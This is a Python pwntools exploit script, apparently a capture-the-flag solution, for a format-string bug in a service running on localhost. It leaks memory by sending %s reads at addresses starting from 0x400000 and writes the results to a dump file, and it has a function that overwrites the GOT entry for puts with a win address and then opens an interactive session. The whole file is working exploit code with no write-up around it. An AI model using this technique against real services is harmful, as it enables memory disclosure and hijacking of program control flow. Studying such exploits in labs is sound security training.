import pwn

def read(host: str, port: int, address: bytes, offset: int, format: str) -> bytes:
    target = pwn.remote(host, port)
    dispatch = f"%{offset + 2}${format} EOF!".ljust(16, "A").encode()
    payload = dispatch + address

    try:
        target.sendline(payload)
        target.recvline()
        target.recvline()
        response = target.recvuntil(b" EOF!", drop=True)
        target.recvline()

        prefix = len(b"so what's your name? ")
        data = response[prefix:]

        target.close()
        return data

    except EOFError:
        pwn.warn(f"fail {hex(pwn.unpack(address, 64))}: retrying...")
        pwn.sleep(1)
        return read(host, port, address, offset, format)

def dump(host: str, port: int, offset: int):
    pwn.context.log_level = "warn"

    with open("dump.raw", "bw") as file:
        # Since PIE is disabled, the start address is fixed.
        # For a 64-bit Linux binary, it's at 0x400000.
        address = 0x400000

        while True:
            destination = pwn.pack(address, 64, "little")

            if b"\n" not in destination:
                data = read(host, port, destination, offset, "s") + b"\x00"
                pwn.warn(f"read {hex(address)}: {data}")
                file.write(data)
            else:
                data = b"\x00"
                pwn.warn(f"skip {hex(address)}: {data}")
                file.write(data)

            address += len(data)

def win(host: str, port: int, offset: int):
    pwn.context.arch = "amd64"

    # Overwrite the GOT entry for puts -> win.
    target = pwn.remote(host, port)
    payload = pwn.fmtstr_payload(offset, {0x404028: 0x4012a8})
    target.sendline(payload)
    target.interactive()

if __name__ == "__main__":
    host, port, offset = "localhost", 9999, 6

    # First, dump the binary and inspect it with a disassembler.
    # Using pwnlib's ELF class won't work since some parts of it are corrupted.
    dump(host, port, offset)

    # Then, update the addresses in win and boom.
    # win(host, port, offset)
